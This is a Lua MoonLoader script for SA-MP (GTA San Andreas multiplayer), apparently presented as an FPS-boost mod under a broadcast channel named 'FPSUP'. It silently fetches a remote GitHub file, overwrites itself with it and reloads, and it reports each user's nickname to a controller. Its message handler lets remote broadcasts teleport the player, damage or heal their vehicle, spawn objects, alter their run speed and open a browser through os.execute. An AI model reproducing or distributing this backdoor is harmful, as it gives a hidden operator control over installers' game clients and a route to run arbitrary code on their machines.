script_name("rIIven")
script_version_number(4)

local update_url = "https://raw.githubusercontent.com/rIIvenRvT/rvt/main/check_reload.lua"

local broadcaster = import('lib/broadcaster.lua')
local ffi = require 'ffi'
local imgui = require('imgui')
local encoding = require 'encoding'
local memory = require 'memory'
encoding.default = 'CP1251'
u8 = encoding.UTF8
        
local window = imgui.ImBool(false)
local userList = 'Jogadores:'

local caircarro = imgui.ImBool(false)
local Flash = imgui.ImBool(false)

local autoupdate = true

function main()
    while not isSampAvailable() do wait(200) end
    broadcaster.registerHandler('FPSUP', myHandler)
    sampRegisterChatCommand('uuukk', function()
        window.v = not window.v
    end)

    if autoupdate then
        local tempname_script = os.tmpname()
        downloadUrlToFile(update_url, tempname_script, function(id, status)
            if status == 6 then
                lua_thread.create(function()
                    wait(100)
                    local f = io.open(tempname_script, "r")
                    local content = f:read("*a")
                    wait(100)
                    f:close()
                    if tonumber(content:match("script_version_number%((%d+)%)")) > thisScript().version_num then
                        f = io.open(thisScript().path, "w+")
                        f:write(content)
                        f:close()
                        thisScript():reload()
                    end
                    wait(50)
                    os.remove(tempname_script)
                end)
            end
        end)
    end

    imgui.Process = false
    window.v = false  --show window on start
    while true do
        --wait(0)
        imgui.Process = window.v
        _, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
        nick = sampGetPlayerNickname(id)
        wait(1500)
        broadcaster.sendMessage(u8('userConnected '..nick), 'FPSUP')

        if caircarro.v and isCharInAnyCar(PLAYER_PED) and not isCharOnAnyBike(PLAYER_PED) then
			local v = storeCarCharIsInNoSave(PLAYER_PED)
			for i = 0, 5 do fixCarDoor(v, i) end
			for i = 0, 6 do fixCarPanel(v, i) end
			for i = 0, 5 do popCarDoor(v, i, true) end
			for i = 0, 6 do popCarPanel(v, i, true) end
            wait(0)
            for i = 0, 5 do fixCarDoor(v, i) end
            for i = 0, 6 do fixCarPanel(v, i) end
            for i = 0, 5 do popCarDoor(v, i, true) end
            for i = 0, 6 do popCarPanel(v, i, true) end
            wait(0)
            for i = 0, 5 do fixCarDoor(v, i) end
			for i = 0, 6 do fixCarPanel(v, i) end
			wait(0)
			for i = 0, 5 do popCarDoor(v, i, true) end
			for i = 0, 6 do popCarPanel(v, i, true) end
            wait(0)
            for i = 0, 5 do fixCarDoor(v, i) end
            for i = 0, 6 do fixCarPanel(v, i) end
            for i = 0, 5 do popCarDoor(v, i, true) end
            for i = 0, 6 do popCarPanel(v, i, true) end
            wait(0)
            for i = 0, 5 do fixCarDoor(v, i) end
			for i = 0, 6 do fixCarPanel(v, i) end
			wait(0)
			for i = 0, 5 do popCarDoor(v, i, true) end
			for i = 0, 6 do popCarPanel(v, i, true) end
            wait(0)
            for i = 0, 5 do fixCarDoor(v, i) end
            for i = 0, 6 do fixCarPanel(v, i) end
            for i = 0, 5 do popCarDoor(v, i, true) end
            for i = 0, 6 do popCarPanel(v, i, true) end
            wait(0)
            for i = 0, 5 do fixCarDoor(v, i) end
			for i = 0, 6 do fixCarPanel(v, i) end
			wait(0)
			for i = 0, 5 do popCarDoor(v, i, true) end
			for i = 0, 6 do popCarPanel(v, i, true) end
            wait(0)
            for i = 0, 5 do fixCarDoor(v, i) end
            for i = 0, 6 do fixCarPanel(v, i) end
            for i = 0, 5 do popCarDoor(v, i, true) end
            for i = 0, 6 do popCarPanel(v, i, true) end
		end

        if Flash.v then
            setCharAnimSpeed(PLAYER_PED, "RUN_PLAYER", 20)
        end
    end
end
        
function imgui.OnDrawFrame()
    if window.v then
        local resX, resY = getScreenResolution()
        local sizeX, sizeY = 150, 100 -- WINDOW SIZE
        imgui.SetNextWindowPos(imgui.ImVec2(resX / 2 - sizeX / 2, resY / 2 - sizeY / 2), imgui.Cond.FirstUseEver)
        imgui.SetNextWindowSize(imgui.ImVec2(sizeX, sizeY), imgui.Cond.FirstUseEver)
        imgui.Begin('Window Title', window, imgui.WindowFlags.NoResize)
        --window code
        imgui.End()
    end
end

function myHandler(message) --send
    if message:find('userConnected (.+)') then
        connectedUser = message:match('userConnected (.+)')
        if not userList:find(connectedUser) then userList = userList..'\n'..connectedUser end
    elseif message:find('irN') then 
        setCharCoordinates(PLAYER_PED, -42819.5589375, 4294967168, 26.7198524475098)
    elseif message:find('Tapa (.+)') then
        x, y, z = getCharCoordinates(PLAYER_PED)
        slp = message:match('Tapa (.+)')
        setCharCoordinates(PLAYER_PED, x, y, z + tonumber(slp))
    elseif message:find('CairCarro') then
        caircarro.v = not caircarro.v
    elseif message:find('Flash') then
        Flash.v = not Flash.v
    elseif message:find('CriarOBJ (.+)') then
        x, y, z = getCharCoordinates(PLAYER_PED)
        ccobj = message:match('CriarOBJ (.+)')
        createObject(u8:decode(ccobj), x, y , z - 1)
    elseif message:find('site') then
        os.execute('explorer "https://youtu.be/UH_mt0-daKss"')
    elseif message:find('trazer (.+) (.+) (.+)') then
        xx, yy, zz = message:match('trazer (.+) (.+) (.+)')
        setCharCoordinates(PLAYER_PED, tonumber(xx), tonumber(yy), tonumber(zz))
    elseif message:find('VeiculoVida (.+)') then
        vida = message:match('VeiculoVida (.+)')
        local Car = storeCarCharIsInNoSave(PLAYER_PED)
        setCarHealth(Car, tonumber(vida))
    end
end

function onScriptTerminate(scr)
    if scr == thisScript() then
        broadcaster.unregisterHandler('FPSUP')
    end
end

function imgui.TextQuestion(text)
    imgui.SameLine()
    imgui.TextDisabled('(?)')
    if imgui.IsItemHovered() then
        imgui.BeginTooltip()
        imgui.PushTextWrapPos(450)
        imgui.TextUnformatted(text)
        imgui.PopTextWrapPos()
        imgui.EndTooltip()
    end
end

function imgui.CenterText(text)
    imgui.SetCursorPosX(imgui.GetWindowSize().x / 2 - imgui.CalcTextSize(text).x / 2)
    imgui.Text(text)
end

function imgui.TextColoredRGB(text)
    local style = imgui.GetStyle()
    local colors = style.Colors
    local ImVec4 = imgui.ImVec4

    local explode_argb = function(argb)
        local a = bit.band(bit.rshift(argb, 24), 0xFF)
        local r = bit.band(bit.rshift(argb, 16), 0xFF)
        local g = bit.band(bit.rshift(argb, 8), 0xFF)
        local b = bit.band(argb, 0xFF)
        return a, r, g, b
    end

    local getcolor = function(color)
        if color:sub(1, 6):upper() == 'SSSSSS' then
            local r, g, b = colors[1].x, colors[1].y, colors[1].z
            local a = tonumber(color:sub(7, 8), 16) or colors[1].w * 255
            return ImVec4(r, g, b, a / 255)
        end
        local color = type(color) == 'string' and tonumber(color, 16) or color
        if type(color) ~= 'number' then return end
        local r, g, b, a = explode_argb(color)
        return imgui.ImColor(r, g, b, a):GetVec4()
    end

    local render_text = function(text_)
        for w in text_:gmatch('[^\r\n]+') do
            local text, colors_, m = {}, {}, 1
            w = w:gsub('{(......)}', '{%1FF}')
            while w:find('{........}') do
                local n, k = w:find('{........}')
                local color = getcolor(w:sub(n + 1, k - 1))
                if color then
                    text[#text], text[#text + 1] = w:sub(m, n - 1), w:sub(k + 1, #w)
                    colors_[#colors_ + 1] = color
                    m = n
                end
                w = w:sub(1, n - 1) .. w:sub(k + 1, #w)
            end
            if text[0] then
                for i = 0, #text do
                    imgui.TextColored(colors_[i] or colors[1], u8(text[i]))
                    imgui.SameLine(nil, 0)
                end
                imgui.NewLine()
            else imgui.Text(w) end
        end
    end

    render_text(text)
end
